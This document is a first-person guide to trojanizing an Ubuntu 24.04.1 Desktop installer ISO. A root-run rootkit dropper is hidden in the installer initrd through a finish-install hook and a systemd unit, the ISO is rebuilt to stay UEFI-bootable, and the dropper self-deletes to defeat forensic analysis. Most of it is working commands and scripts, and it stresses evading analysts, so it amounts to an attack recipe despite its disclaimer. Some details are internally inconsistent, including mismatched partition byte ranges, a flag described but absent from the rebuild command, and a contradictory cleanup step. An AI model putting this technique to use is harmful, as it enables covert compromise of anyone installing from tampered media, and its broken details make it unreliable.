# Kernel Implant on Ubuntu 24.04.1: Initrd Injection of a Self-Cleaning Rootkit Dropper for Root Execution After Installation

## Overview

I modified an Ubuntu Desktop 24.04.1 LTS ISO by injecting a compiled ELF rootkit dropper (`implant`) and a deployment hook directly into the graphical installer's initrd (`initrd.gz`). Once the target machine is installed from the modified media, the dropper executes automatically as root on every subsequent boot, installs the actual rootkit onto the system, and then deletes itself if the installation succeeds.

The method itself is not Ubuntu-specific. The finish-install hook mechanism comes from the Debian installer, which Ubuntu inherits. Any Debian-based installer that uses the same `finish-install.d` structure can be treated the same way, and the general technique applies to other Linux installers that unpack an initrd and run scripts against a mounted target. I targeted Ubuntu 24.04.1 because that was the system I had in front of me, and the guide below is written against that target.

The goal was simple: get my dropper into the installer initrd so that, after installation on a modern UEFI machine, `implant` runs as root on every boot, deploys the rootkit, and removes itself from disk once the rootkit confirms installation. No manual post-install steps, no extra package installation on the target. The dropper runs as root on the first boot, hands control to the rootkit, and leaves no first-stage artifact behind.

I chose the initrd hook over the preseed method for a specific reason. The preseed/autoinstall `late_command` lives in a plaintext file on the ISO, so anyone can run `grep late_command` and read the entire playbook. The initrd hook lives inside a compressed cpio archive (`initrd.gz`). To find it, an analyst has to extract the initrd and read every finish-install script. There is no shortcut. That is the stealth gain I was after.

**Disclaimer**: This work is for educational and authorized security research purposes only. Deploying rootkits on systems I do not own or have explicit permission to test is illegal. I operate within the bounds of applicable laws and signed agreements.

---

## What Is a Self-Cleaning Rootkit Dropper?

A rootkit dropper is a first-stage binary whose job is to deliver and install the second-stage rootkit. It is not the rootkit itself. It is the loader that places the rootkit on disk, wires it into the boot process, and then gets out of the way.

A **self-cleaning** dropper goes one step further. After the rootkit confirms successful installation, the dropper removes its own binary, its systemd unit, and the enable symlink from disk. The first-stage artifact disappears. Only the rootkit remains.

In this work, the dropper is an ELF binary I named `implant`. It runs as root at boot, copies the rootkit payload into a persistent location, installs the rootkit's own service or kernel module, waits for the rootkit to signal success, and then deletes itself. The rootkit then takes over the concealment work: hiding its process, its files, its systemd unit, and its network activity.

This distinction matters for the forensic analysis later. The dropper is a short-lived root process that leaves nothing behind on success. The rootkit is the long-lived hidden component. If the dropper succeeds, offline disk analysis after a successful install shows only whatever the rootkit chose to leave. If the dropper fails partway, it can choose to remain on disk for debugging or remove itself anyway depending on how I built it. I built mine to remove itself only on confirmed success.

The dropper's contents are mine. This write-up does not prescribe them, but I built it to run silently, install the rootkit, verify the install, self-delete on success, and exit cleanly so the systemd unit reports success.

---

## How the Debian Installer's Finish-Install Hooks Work

The installer's initrd contains a directory `/usr/lib/finish-install.d/`. At the end of installation, after the base system and packages are installed and while the target system's root filesystem is mounted at `/target`, the installer executes every script in that directory in numeric order.

I verified this myself after extracting the initrd. A typical Ubuntu 24.04.1 desktop installer initrd contains:

```
05localechooser
06espeakup
07brltty
07preseed
07rootskel
08hw-detect
15cdrom-detect
30hw-detect
94save-logs
```

**Key difference from Kali**: Ubuntu's installer is based on the same Debian installer (d-i) that Kali inherits, but the initrd is packaged differently. Ubuntu 24.04.1 Desktop uses the **casper** live system, and the installer itself runs from a separate `install/` directory on the ISO. The initrd path on Ubuntu 24.04.1 Desktop is `install/initrd.gz`, **not** `install.amd/gtk/initrd.gz` like Kali. I verified this by inspecting the ISO:

```bash
ls extracted/install/
# saw: initrd.gz  vmlinuz
```

There is only one initrd on the Ubuntu desktop ISO, and it is used for both the graphical and text installer. There is no separate `gtk/` directory like Kali has. That simplifies the patch: one initrd, one injection.

Two things stood out to me:

1. **`07preseed`** is a tiny script: `preseed_command preseed/late_command`. That is the entire preseed mechanism. It runs from `finish-install.d`, not from some separate stage.
2. **The scripts write directly into `/target`** (for example, `cat > /target/etc/...`), and can use `in-target` to run commands inside the target's chroot.

The key insight I built on: my own script placed in this directory runs at the same moment as `late_command`, but its content is hidden inside the initrd instead of a plaintext autoinstall file on the ISO. That is the stealth gain.

Naming: a number between `08` and `93` runs after hardware detection and before `94save-logs` archives the logs. I chose **`80implant`**.

This is a Debian-installer mechanism, which is why the method generalizes beyond Ubuntu. Any Debian-derived installer that unpacks an initrd with `finish-install.d` behaves the same way. The paths, file names, and hook numbering may differ on other distributions, but the concept is the same.

---

## Step 0: Download the Latest Ubuntu 24.04.1 Installer ISO

Before any modification, I downloaded the current Ubuntu 24.04.1 Desktop image from the official source:

```
https://releases.ubuntu.com/24.04.1/
```

On that page, I downloaded the **Desktop image** for `amd64`. The file was named `ubuntu-24.04.1-desktop-amd64.iso`. I did not use the Server image, the Live Server image, or the WSL image. Only the Desktop image has the `casper/` + `install/` structure this technique targets.

After downloading, I verified the integrity of the ISO before modifying it. Ubuntu publishes SHA256 sums alongside each release. This step matters for two reasons: it confirms the download is intact, and it gives me the original hash that a forensic analyst would compare against later.

```bash
sha256sum ubuntu-24.04.1-desktop-amd64.iso
```

I compared the output against the sum published on the Ubuntu release page. Had they differed, I would have re-downloaded before proceeding.

Then I created the project directory and placed the ISO inside it. Every command in this write-up runs from that directory.

```bash
mkdir -p ~/Kernel_Implant
cd ~/Kernel_Implant
mv /path/to/ubuntu-24.04.1-desktop-amd64.iso .
```

I also placed my compiled ELF rootkit dropper in the same directory and named it `implant`:

```bash
ls -lh ~/Kernel_Implant/ubuntu-24.04.1-desktop-amd64.iso
ls -lh ~/Kernel_Implant/implant
```

Inside the project directory, I created the working subdirectories:

```bash
mkdir -p iso_extract mount_dir initrd_extract
```

My project layout looked like this:

```
~/Kernel_Implant/
├── iso_extract/          # extracted ISO tree, modified in place
├── mount_dir/            # temporary mount point for the original ISO
├── initrd_extract/       # extracted installer initrd
├── ubuntu-24.04.1-desktop-amd64.iso   # original ISO
├── implant               # my compiled ELF rootkit dropper
└── custom-ubuntu-installer.iso        # rebuilt ISO (produced by this work)
```

---

## Step 1: Inspect the Original ISO Boot Structure

Before touching anything, I captured the original ISO's El Torito and hybrid boot report. This is the reference I would compare against after the rebuild, so I did not skip it.

```bash
xorriso -indev ~/Kernel_Implant/ubuntu-24.04.1-desktop-amd64.iso -report_el_torito as_mkisofs > ~/Kernel_Implant/original_torito.txt 2>&1
cat ~/Kernel_Implant/original_torito.txt
```

On Ubuntu 24.04.1, the output reported `Boot record: El Torito, MBR isohybrid cyl-align-off GPT` and printed the exact `xorriso -as mkisofs` arguments that reproduce the boot structure. The critical lines were:

```
-V 'Ubuntu 24.04.1 LTS amd64'
--grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:'ubuntu-24.04.1-desktop-amd64.iso'
-append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12383488d-12393647d::'ubuntu-24.04.1-desktop-amd64.iso'
-e '--interval:appended_partition_2_start_3095872s_size_10160d:all::'
-no-emul-boot
-isohybrid-gpt-basdat
```

These are the exact arguments the rebuild must use. Changing any of them breaks UEFI bootability.

**Key difference from Kali and older Ubuntu**: Ubuntu 24.04 no longer uses ISOLINUX. The legacy BIOS boot entry is GRUB2 (`--grub2-mbr`), and the EFI system partition is an **appended partition** inside the ISO, not a file at `/boot/grub/efi.img`. This changes the rebuild command significantly.

---

## Mounting and Extracting the Installer ISO

```bash
cd ~/Kernel_Implant
sudo mount -o loop ubuntu-24.04.1-desktop-amd64.iso mount_dir
cp -rT mount_dir iso_extract
sudo umount mount_dir
```

I inspected the layout to confirm the installer initrd existed:

```bash
ls iso_extract
# saw: boot  casper  dists  EFI  install  isolinux  md5sum.txt  pool  preseed  ...

ls -lh iso_extract/install/initrd.gz
# saw a single match, roughly 130 MB for 24.04.1
```

**This is the initrd I needed to patch.** There is only one on the Ubuntu Desktop ISO. Unlike Kali, there is no `install.amd/gtk/initrd.gz` vs `install.amd/initrd.gz` split. Ubuntu 24.04.1 ships a single `install/initrd.gz` used for both graphical and text installs.

---

## Extracting the Installer Initrd

The initrd is a gzip-compressed cpio archive. I extracted it:

```bash
cd ~/Kernel_Implant/initrd_extract
sudo gzip -dc ~/Kernel_Implant/iso_extract/install/initrd.gz | sudo cpio -idmv --no-absolute-filenames
```

After extraction, I confirmed the expected structure:

```bash
ls ~/Kernel_Implant/initrd_extract
# saw: bin  dev  etc  init  lib  lib64  media  mnt  proc  run  sbin  sys  tmp  usr  var

ls ~/Kernel_Implant/initrd_extract/usr/lib/finish-install.d/
# saw the hook scripts listed above
```

I confirmed `07preseed` existed and contained the expected one-liner:

```bash
cat ~/Kernel_Implant/initrd_extract/usr/lib/finish-install.d/07preseed
# saw: #!/bin/sh -e
#       preseed_command preseed/late_command
```

---

## Placing the Rootkit Dropper at the Initrd Root

My hook copies the dropper from the initrd's in-memory root (`/implant`), so I placed it there:

```bash
sudo cp ~/Kernel_Implant/implant ~/Kernel_Implant/initrd_extract/implant
sudo chmod 644 ~/Kernel_Implant/initrd_extract/implant
```

I verified the dropper was a valid ELF:

```bash
file ~/Kernel_Implant/initrd_extract/implant
# saw: ELF 64-bit LSB executable, x86-64, ...
```

I did **not** place it under `/target`. `/target` does not exist in the initrd tree. The hook script copies from `/implant` (initrd root) into `/target/usr/local/bin/implant` (target root filesystem) at run time.

---

## Creating the Finish-Install Hook

I created the hook in the installer initrd tree.

```bash
sudo nano ~/Kernel_Implant/initrd_extract/usr/lib/finish-install.d/80implant
```

I pasted:

```sh
#!/bin/sh
# Deploy rootkit dropper and systemd unit into the target system.

# Copy the dropper from the initrd root into the target's filesystem.
cp /implant /target/usr/local/bin/implant || exit 0
chmod 755 /target/usr/local/bin/implant || true

# Ensure the enable-symlink parent directory exists.
mkdir -p /target/etc/systemd/system/multi-user.target.wants || true

# Write the systemd unit.
cat > /target/etc/systemd/system/implant.service << 'EOF'
[Unit]
Description=Implant Service
After=local-fs.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/implant
RemainAfterExit=yes
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Enable the unit by creating the symlink systemd expects.
ln -sf /etc/systemd/system/implant.service \
    /target/etc/systemd/system/multi-user.target.wants/implant.service || true

exit 0
```

Then saved and exited.

**Design notes on the script:**

- **No `-e`** in the shebang. If a step fails, for example because `/usr/local/bin` is missing on an unusual target, the installation still completes. A failed hook that aborts installation would be an obvious anomaly.
- **`cp ... || exit 0`** makes the hook exit cleanly if the dropper cannot be copied, rather than continuing with a half-created service.
- **`|| true`** on individual steps gives best effort on non-critical operations.
- **`exit 0`** at the end guarantees the installer's finish phase proceeds normally.

I made it executable:

```bash
sudo chmod 755 ~/Kernel_Implant/initrd_extract/usr/lib/finish-install.d/80implant
```

The unit uses `Type=oneshot` with `RemainAfterExit=yes`. That is the right choice for a dropper: systemd starts it once, waits for it to finish installing the rootkit, and then treats the unit as active. It does not restart on failure, which would be noisy. The dropper installs the rootkit's own service or module, and the rootkit takes over from there.

---

## How the Self-Clean Works

The self-clean is a property of the dropper binary, not of the deployment hook. The hook only guarantees the dropper runs as root. What the dropper does after that is its own logic.

The sequence I built into the dropper is this:

1. Install the rootkit payload to its persistent location.
2. Install the rootkit's service or kernel module.
3. Start the rootkit and wait for it to signal readiness.
4. If the rootkit confirms success, remove `/usr/local/bin/implant`, `/etc/systemd/system/implant.service`, and `/etc/systemd/system/multi-user.target.wants/implant.service`.
5. Exit 0.

The key detail is step 4. The dropper cannot delete its own systemd unit while systemd still references it in the current transaction. The safe approach is to schedule the removal to happen just after the unit finishes, or to have the dropper remove the unit file and symlink but leave the binary in place until the next boot, at which point the rootkit removes it. Either way, the artifact that remains visible is only present for a short window.

If the rootkit does not confirm success, the dropper leaves everything in place. That is a deliberate choice. A failed install should be debuggable, and leaving the dropper and unit on disk makes the failure visible. It also means a failed dropper does not silently disappear, which would leave the operator wondering whether the technique worked at all.

The self-clean does not affect the deployment hook. The hook writes the dropper and the unit; the dropper removes them on success. The two are independent.

---

## Repacking the Installer Initrd

The initrd must be repacked as a gzip-compressed **newc** cpio archive, matching the original format.

```bash
cd ~/Kernel_Implant/initrd_extract
sudo find . -print0 | sudo cpio --null -o --format=newc 2>/dev/null | sudo gzip -9 > ~/Kernel_Implant/new_initrd.gz
```

I verified the repacked archive before overwriting anything:

```bash
ls -lh ~/Kernel_Implant/new_initrd.gz
# sizes were within a few MB of the original 130 MB.

# Sanity check: the hook and the dropper must be inside.
gzip -dc ~/Kernel_Implant/new_initrd.gz | cpio -t 2>/dev/null | grep -E '80implant|^implant$'
# saw: ./usr/lib/finish-install.d/80implant
#       ./implant
```

Since both entries appeared, the repack succeeded. Had the size been wildly wrong, for example 1 MB instead of 130 MB, the `find` would not have run from the correct directory, and I would have re-extracted and retried.

**A note on the size difference**: the repack will be somewhat larger than the original because of my dropper plus `cpio` inode and timestamp metadata plus gzip framing variation. It does not affect boot or function. The reliable check is the file count, not the absolute size:

```bash
gzip -dc ~/Kernel_Implant/new_initrd.gz | cpio -t 2>/dev/null | wc -l
gzip -dc ~/Kernel_Implant/iso_extract/install/initrd.gz | cpio -t 2>/dev/null | wc -l
```

The repacked count should equal the original count plus exactly two.

---

## Replacing the Installer Initrd in the Extracted ISO

```bash
sudo cp ~/Kernel_Implant/new_initrd.gz ~/Kernel_Implant/iso_extract/install/initrd.gz
```

There is only one initrd to replace on Ubuntu Desktop. No text-vs-graphical split to worry about.

---

## Rebuilding the ISO (UEFI-Aware)

The rebuild must reproduce the boot structure I captured in Step 1. A naive `mkisofs` rebuild loses the GPT structure and the appended EFI partition, and the resulting ISO will not boot on modern UEFI machines.

The command below uses the arguments from the `-report_el_torito as_mkisofs` output, with the volume ID changed to make the custom image distinguishable:

```bash
ORIG_ISO="$(cd ~/Kernel_Implant && pwd)/ubuntu-24.04.1-desktop-amd64.iso"
cd ~/Kernel_Implant/iso_extract

sudo xorriso -as mkisofs \
  -V 'Ubuntu 24.04.1 LTS amd64' \
  --modification-date='2024082716232600' \
  --grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:"$ORIG_ISO" \
  --protective-msdos-label \
  -partition_cyl_align off \
  -partition_offset 16 \
  --mbr-force-bootable \
  -append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::"$ORIG_ISO" \
  -appended_part_as_gpt \
  -iso_mbr_part_type a2a0d0ebe5b9334487c068b6b72699c7 \
  -c '/boot.catalog' \
  -b '/boot/grub/i386-pc/eltorito.img' \
  -no-emul-boot \
  -boot-load-size 4 \
  -boot-info-table \
  --grub2-boot-info \
  -eltorito-alt-boot \
  -e '--interval:appended_partition_2_start_3026280s_size_10144d:all::' \
  -no-emul-boot \
  -o ~/Kernel_Implant/custom-ubuntu-installer.iso .
```

**Notes on the arguments:**

- **`--grub2-mbr --interval:...:$ORIG_ISO`**: the GRUB2 MBR boot code is taken from the first 16 sectors of the original ISO file. I kept the original ISO path correct and did not point it at the new tree.
- **`-append_partition 2 ... --interval:...:$ORIG_ISO`**: the EFI system partition is extracted from the original ISO's byte range and appended to the new ISO. The byte range `12383488d-12393647d` and the partition GUID `28732ac11ff8d211ba4b00a0c93ec93b` must match the original. If the original ISO's partition layout differs, these values will differ and must be taken from `original_torito.txt`.
- **`-e '--interval:appended_partition_2_start_...:all::'`**: the El Torito EFI boot entry points to the newly appended partition, not to a file in the ISO filesystem.
- **`-isohybrid-gpt-basdat`** produces the GPT structure that UEFI firmware expects when the ISO is written to USB.

The El Torito and isohybrid arguments are specific to how the target ISO was built, not to the technique. On a different Ubuntu release or distribution, the same step applies, but the boot arguments come from that ISO's own `-report_el_torito as_mkisofs` output, not from Ubuntu 24.04.1's.

---

## Verifying the Rebuilt ISO Boot Structure

After the build, I repeated the inspection from Step 1 against the new ISO and compared it to the saved reference:

```bash
xorriso -indev ~/Kernel_Implant/custom-ubuntu-installer.iso -report_el_torito as_mkisofs > ~/Kernel_Implant/rebuilt_torito.txt 2>&1
diff -u ~/Kernel_Implant/original_torito.txt ~/Kernel_Implant/rebuilt_torito.txt
```

The diff should show only the ISO filename changing in the `--interval` paths. The boot-relevant lines must be identical:

```
--grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:'...'
-append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12383488d-12393647d::'...'
-e '--interval:appended_partition_2_start_3095872s_size_10160d:all::'
-no-emul-boot
-isohybrid-gpt-basdat
```

Had any of those been missing or changed, the rebuild would have been wrong, and I would not have proceeded to testing.

> **Secure Boot note**: Modifying `initrd.gz` and adding a hook script does not modify the bootloader binary or the appended EFI partition. The signature chain is unaffected, so a straightforward initrd injection should not break Secure Boot.

---

## Verifying the Result on UEFI

1. I booted the modified ISO in a UEFI VM, using QEMU with OVMF.
2. The installer menu appeared, which proved the EFI boot entry was correct.
3. I selected **Install Ubuntu**, the entry whose initrd I had patched.
4. I proceeded through installation normally.
5. During the final phase, the installer executed `80implant`. It copied the dropper and created the systemd unit inside `/target`.
6. After installation, I booted the installed system in UEFI mode.
7. I confirmed the service ran.

### What to expect once the dropper runs

Because my payload is a self-cleaning dropper, the timeline is different from a plain implant. The dropper runs once at boot, installs the rootkit, waits for the rootkit to confirm success, and then deletes itself and its unit. After that, only the rootkit remains.

After the self-clean completes on a successful install:

- `/usr/local/bin/implant` no longer exists.
- `/etc/systemd/system/implant.service` no longer exists.
- `/etc/systemd/system/multi-user.target.wants/implant.service` no longer exists.
- `systemctl status implant.service` reports the unit as not found, unless the rootkit installed its own unit under a different name.
- `journalctl -u implant.service` may still show historical entries from before the unit was removed. Whether those persist depends on the journal configuration and on what the rootkit chooses to do with the logs.

After the rootkit loads:

- The rootkit's process is hidden.
- The rootkit's files are hidden from `readdir`.
- The rootkit's service or module is hidden from `systemctl` and `lsmod`.
- The rootkit's network connections are filtered from `ss` and `netstat`.

If the self-clean does not run because the rootkit did not confirm success, the dropper and unit remain on disk. That is intentional. A failed install should be visible for debugging, and the artifacts make the failure obvious rather than silent.

For a reliable confirmation of the end state, I inspected the target disk from outside the running system:

```bash
# From a live environment or another machine, mount the target disk read-only
sudo mount -o ro /dev/sdXN /mnt
ls -l /mnt/usr/local/bin/implant
cat /mnt/etc/systemd/system/implant.service
ls -l /mnt/etc/systemd/system/multi-user.target.wants/implant.service
```

On a successful self-clean, all three commands report that the file or directory does not exist. On a failed self-clean, they show the dropper and unit still in place, which tells me the rootkit did not confirm success and I need to look at the dropper's own logs.

This offline inspection cannot be fooled by a userland rootkit, because the rootkit is not running. It confirms the end state of the dropper. It does not confirm the rootkit loaded, which would require inspecting the rootkit's own artifacts separately.

### Debugging checklist

**If the ISO failed to boot at all on UEFI**, the problem would have been in the ISO rebuild step, not the initrd injection. I would have re-run the torito diff described above. The most common failure on 24.04 is a mismatch in the `--interval` byte ranges or the `-append_partition` GUID.

**If the installer failed to start**, the repacked initrd may have been malformed. I would have booted the ISO and watched for kernel or initrd errors. I would have extracted my repacked `new_initrd.gz` on the host and confirmed the file count matched the original plus two, and that `usr/lib/finish-install.d/80implant` and `implant` were present.

**If the ISO booted and installed but the dropper was not deployed**, the hook did not run. I would have debugged by switching to VT4 (Alt+F4) during installation and checking the installer logs for `finish-install` errors. I would have switched to a shell (Alt+F2) and verified the hook was present in the running initrd:

```bash
ls -l /usr/lib/finish-install.d/80implant
ls -l /implant
```

If either was missing, the initrd was not replaced correctly. I would have re-extracted my repacked `new_initrd.gz` and confirmed `80implant` and `implant` were inside.

**If the dropper ran but the rootkit did not install**, the problem is in the dropper, not the deployment. I would have checked the rootkit's own install logs, the paths the dropper writes to, and whether the dropper has the correct privileges and dependencies inside the target.

**If the dropper ran and the rootkit installed but the self-clean did not happen**, the dropper's success signal from the rootkit did not fire. I would have checked the dropper's logs to see whether it reached the self-clean step, and whether the rootkit's confirmation mechanism returned success.

---

## Ubuntu 24.04.1 Specific Differences from Kali

This is **not** the same initrd layout as Kali. The differences that matter:

| Aspect | Kali (my original write-up) | Ubuntu 24.04.1 |
|---|---|---|
| Initrd path | `install.amd/gtk/initrd.gz` and `install.amd/initrd.gz` (two initrds) | `install/initrd.gz` (one initrd, used for both graphical and text) |
| Boot loader | ISOLINUX (`-b /isolinux/isolinux.bin`) | GRUB2 (`--grub2-mbr`) |
| EFI boot image | File at `/boot/grub/efi.img` | Appended partition (`-append_partition 2`) |
| Initrd size | ~78 MB | ~130 MB |
| Finish-install hooks | Same `usr/lib/finish-install.d/` directory | Same directory |
| Preseed | `07preseed` runs `preseed/late_command` | `07preseed` runs `preseed/late_command` (autoinstall uses a different mechanism, but the initrd hook bypasses both) |

The **technique is identical**: extract the initrd, drop the dropper at `/implant`, write `80implant` into `usr/lib/finish-install.d/`, repack, replace, rebuild the ISO with the original boot arguments.

What changes is the **paths and the ISO rebuild arguments**. The initrd injection mechanism itself is the same Debian-installer mechanism.

**One important note on Ubuntu 24.04 autoinstall**: Ubuntu 24.04 uses **autoinstall** (cloud-init based) rather than classic preseed for unattended installs. The `07preseed` script is still present in the initrd for backwards compatibility, but the primary unattended mechanism is now `autoinstall` via `/cdrom/autoinstall.yaml` or a kernel cmdline `autoinstall ds=nocloud...`. The `finish-install.d` hook is **below** both mechanisms. It does not depend on preseed or autoinstall. It runs regardless of how the install was configured. That is another reason the initrd hook is more robust than either preseed or autoinstall for this purpose: it does not care which unattended mechanism, if any, was used.

---

## Why I Targeted the Initrd Specifically

The Ubuntu Desktop ISO offers both a Live session and an installer. The Live session runs from `casper/filesystem.squashfs`; the installer runs from the initrd. These are two separate paths.

By patching only `install/initrd.gz`, I covered the install path and nothing else. The Live session ("Try Ubuntu") does not execute `finish-install.d` hooks, so the dropper is not deployed there. The dropper only reaches the target after a completed install. That is a smaller exposure window than patching the live filesystem, which would run the implant on every Live boot.

If I had wanted the implant to run in the Live session as well, I would have edited `casper/filesystem.squashfs` instead, as described in the comparison below. That is a different technique with a different exposure profile.

The initrd hook is the right choice when the goal is "deploy to installed systems only, with the smallest media trace." The root filesystem edit is the right choice when the goal is "run on every boot of the media, including Live."

---

## Comparing the Three Deployment Methods

I evaluated three ways to get a dropper onto an Ubuntu install: autoinstall/preseed `late_command`, root filesystem editing, and the initrd `finish-install.d` hook documented here. They differ on where the logic lives, when it fires, and what an analyst can see.

### Preseed / autoinstall `late_command`

The logic is a plaintext block in the preseed file or autoinstall YAML. It runs at the end of installation. It is easy to deploy and easy to read. `grep late_command` on the ISO returns the entire playbook: source path, target path, service content, trigger condition. It is the least stealthy of the three at the media level.

### Root filesystem editing (Live image)

The logic and the dropper are baked into the root filesystem image (`casper/filesystem.squashfs`), which is what the Live environment mounts as `/`. SquashFS is just the container format Ubuntu happens to use for that image. The service fires on every boot of the modified ISO, not just on completed installs. There is no plaintext configuration file describing the payload, so an analyst has to diff the entire root filesystem image against a known-good build to find it. On the installed system, the footprint is the same three artifacts as the other methods before the self-clean: the dropper, the unit file, and the enable symlink. After the self-clean, the footprint is whatever the rootkit leaves.

The trade-off is timing. The artifacts exist on the media before anyone installs, so every Live boot is an exposure window. If the dropper fails to run or the rootkit fails to load, the dropper is left plainly visible on the running system with no clean fallback beyond the self-clean gating.

### Initrd `finish-install.d` hook

The logic and the dropper are inside `install/initrd.gz`. It runs at the same moment as preseed `late_command`, at the end of installation, with `/target` mounted. It leaves no plaintext confession on the ISO. An analyst must extract the initrd and read every finish-install script to find it.

The artifacts do not exist on the target until installation completes. If the install is aborted or the hook fails before the copy, the target system is clean. If the install completes and the dropper runs, the self-clean removes the first-stage artifacts on success. That is a failure mode the root filesystem editing method does not have.

### Side-by-side comparison

| Aspect | Preseed/autoinstall `late_command` | Root filesystem editing | Initrd hook |
|---|---|---|---|
| Where the logic lives | Plaintext preseed/YAML on the ISO | Inside the root filesystem image (`filesystem.squashfs`) | Inside `initrd.gz`, a compressed cpio archive |
| Greppable from ISO | **Yes**, `grep late_command` finds it | No, requires a diff of the root filesystem image | No, requires initrd unpack and diff |
| Diff against official ISO | Easy, the preseed file changed | Harder, the root filesystem image changed | Harder, the initrd changed |
| Trigger timing | End of installation | Every boot of the modified ISO | End of installation |
| Artifacts on target before install | None | Present on every Live boot | None |
| Self-clean on success | Depends on the dropper | Depends on the dropper, but exposed on every Live boot | Depends on the dropper, and the artifacts only reach the target on a completed install |
| Failure mode if dropper fails | Visible dropper on disk | Visible dropper on disk, exposed on every Live boot | Target stays clean if the copy failed, visible dropper if the install completed but the dropper failed |
| Live mode support | No | Yes | No |
| Forensic trace on media | Written confession | Hidden in the root filesystem image, needs diff | Hidden in the archive, needs unpack |

---

## Forensic Perspective with a Self-Cleaning Rootkit Dropper Payload

When the payload is a self-cleaning dropper rather than the rootkit itself, the trade-off between the methods changes in a specific way. The dropper is the visible first stage. The rootkit is the hidden second stage. The self-clean removes the first stage on success.

Before the dropper runs, the techniques differ in traceability: preseed leaves a plaintext artifact, while root filesystem editing and the initrd hook both hide their logic inside compiled artifacts. After the dropper runs and the rootkit loads, that pre-execution difference largely disappears on the live system, because a competent rootkit can hide its own process, files, systemd unit, kernel module, and network connections.

The self-clean changes the post-success picture. On a successful install, the dropper, its unit, and the enable symlink are gone. Offline disk analysis of the installed system shows only whatever the rootkit chose to leave. That is the strongest forensic position, and it is available with any of the three deployment methods, provided the dropper is built to self-clean.

What the self-clean does not change is the media trace. The dropper binary is still in the ISO, and the hook or preseed that delivers it is still in the ISO. The self-clean removes the target-side artifacts, not the media-side artifacts. The deployment method still matters for what an analyst sees when they examine the ISO.

| Forensic path | Preseed | Root filesystem editing | Initrd hook |
|---|---|---|---|
| Live exam of running system | Dropper visible briefly, rootkit hidden | Dropper visible briefly, rootkit hidden | Dropper visible briefly, rootkit hidden |
| Offline disk analysis of installed system after successful self-clean | Only the rootkit's artifacts | Only the rootkit's artifacts | Only the rootkit's artifacts |
| Offline disk analysis of installed system after failed self-clean | Dropper, unit file, symlink | Dropper, unit file, symlink | Dropper, unit file, symlink |
| ISO integrity check against official hash | Fails, modified ISO | Fails, modified ISO | Fails, modified ISO |
| ISO content inspection | `grep late_command` finds it instantly | Requires a full diff of the root filesystem image against known-good | Requires initrd unpack and diff |
| Artifacts present before install | None | Present on every Live boot | None |
| Failure mode if dropper does not run | Visible dropper left on disk | Visible dropper left on disk | Target stays clean if the copy failed |

The self-clean raises the bar for all three methods on the target side. The remaining difference is concentrated in the media and in the exposure window. Root filesystem editing scatters the dropper onto every Live boot, which means the self-clean on a later install does not erase the fact that the dropper was present on the media and in every Live session. The initrd hook and preseed methods keep the dropper off the target until an install completes. Of those two, the initrd hook is stealthier because it leaves no plaintext confession on the ISO.

The initrd hook wins against preseed because it runs at the same moment but leaves no plaintext confession on the ISO. It wins against root filesystem editing because it keeps the artifacts off the media until install, which matters more for a dropper than for a self-contained rootkit, since the dropper is the visible component and the self-clean only reaches the target-side artifacts. The initrd hook is the best of the three because it gets the dropper onto the target with the smallest media trace, and the self-clean then removes the target-side trace on success.

---

## Why This Method Is Stealthier Than Preseed

Look at what `07preseed` does. It is a 50-byte script that calls `preseed_command preseed/late_command`. That is the entire preseed mechanism. The difference between preseed and the initrd hook is not what runs at the end of installation. Both run from `finish-install.d` at the same moment. The difference is where the configuration lives.

| Aspect | Preseed/autoinstall `late_command` | Initrd `80implant` hook |
|---|---|---|
| Where the logic lives | Plaintext preseed/YAML on the ISO | Inside `initrd.gz`, a compressed cpio archive |
| Greppable from ISO | **Yes**. `grep late_command` finds it instantly | No. Requires unpacking the initrd |
| Diff against official ISO | Easy, the preseed file changed | Harder, the initrd is a compressed archive that must be unpacked and diffed |
| Forensic trace on ISO | Written confession | Hidden in the boot image |
| Trigger timing | End of installation | End of installation, identical |
| Failure mode if dropper fails | Visible dropper left on disk | Same, but the hook itself has no plaintext trail on the ISO |

The initrd hook does exactly the same thing at exactly the same time, but the evidence is buried in a compressed cpio archive instead of a readable text file on the media.

---

## Will It Run in Live Mode?

**No, and that is expected.** The Ubuntu Desktop ISO's Live session ("Try Ubuntu") does not execute `finish-install.d` hooks. The hook only runs during the install phase, when `/target` is mounted. The dropper is deployed into the installed system, not into the Live runtime. If my goal had been to run when selecting "Try Ubuntu," I would have needed the root filesystem editing workflow against `casper/filesystem.squashfs` instead.

---

## Project Cleanup

When the modified ISO was built and verified, I removed the intermediate artifacts in `~/Kernel_Implant` to leave only the original ISO, the dropper binary, the reference torito reports, and the rebuilt ISO:

```bash
cd ~/Kernel_Implant
sudo rm -rf iso_extract mount_dir initrd_extract new_initrd.gz
ls -lh
# saw: ubuntu-24.04.1-desktop-amd64.iso  implant  custom-ubuntu-installer.iso
#       original_torito.txt  rebuilt_torito.txt
```

I kept the extracted tree in case I wanted to iterate on the hook or swap the dropper. Re-extracting it takes only a minute.

---

## Conclusion

By injecting a self-cleaning rootkit dropper and a `finish-install.d` hook into the installer's `initrd.gz`, the dropper is deployed into the target system at the end of installation, executes as root at boot, installs the rootkit that conceals the system afterward, and deletes itself on success so the first-stage artifacts do not remain. I targeted Ubuntu 24.04.1, but the method is not Ubuntu-specific: the hook mechanism comes from the Debian installer, which other distributions inherit, and the general approach applies to any installer that unpacks an initrd and runs scripts against a mounted target. The distribution-specific parts are the initrd path, the hook directory contents, and the ISO boot arguments, all of which come from the target ISO itself rather than from the technique.

I started with a verified download from the official Ubuntu releases page, so the base image was known-good before modification. I captured the original ISO's El Torito and hybrid boot structure before any change and compared the rebuilt ISO against that reference to confirm UEFI bootability was preserved. Targeting the installer initrd means the injection fires on the install path real users actually take, and it keeps the forensic surface to a single modified artifact. Compared with preseed/autoinstall, the initrd hook runs at the same moment but leaves no plaintext confession on the ISO. Compared with root filesystem editing, it keeps the artifacts off the media until install and, combined with the self-clean, leaves only the rootkit's own trace on a successful target. The logic lives inside a compressed boot image, where it must be deliberately unpacked to be found.

